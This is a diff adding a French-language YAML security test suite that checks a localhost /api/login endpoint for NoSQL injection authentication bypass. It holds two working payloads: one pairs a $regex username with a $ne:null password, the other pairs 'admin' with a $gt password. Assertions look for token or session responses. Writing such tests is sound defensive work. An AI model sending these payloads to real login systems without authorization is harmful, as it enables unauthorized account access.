@@ -1,0 +1,39 @@
+name: "Injection NoSQL - Contournement d'Authentification"
+variables:
+  base_url: "http://localhost:8080"
+defaults:
+  read_timeout: 10
+  verify: false
+  follow_redirects: false
+
+tests:
+  - id: nosql-bypass-regex
+    name: "NoSQL Auth Bypass - Opérateur $regex"
+    severity: critical
+    request:
+      method: POST
+      path: "/api/login"
+      headers:
+        Content-Type: "application/json"
+      json:
+        username: {"$regex": "^ad"}
+        password: {"$ne": null}
+    assert:
+      - status: 200
+      - body_regex: "(?i)(token|session|welcome|dashboard)"
+      - header_present: "Set-Cookie"
+
+  - id: nosql-bypass-gt
+    name: "NoSQL Auth Bypass - Opérateur $gt"
+    severity: critical
+    request:
+      method: POST
+      path: "/api/login"
+      headers:
+        Content-Type: "application/json"
+      json:
+        username: "admin"
+        password: {"$gt": ""}
+    assert:
+      - status: 200
+      - body_regex: "(?i)(token|session|welcome|dashboard)"
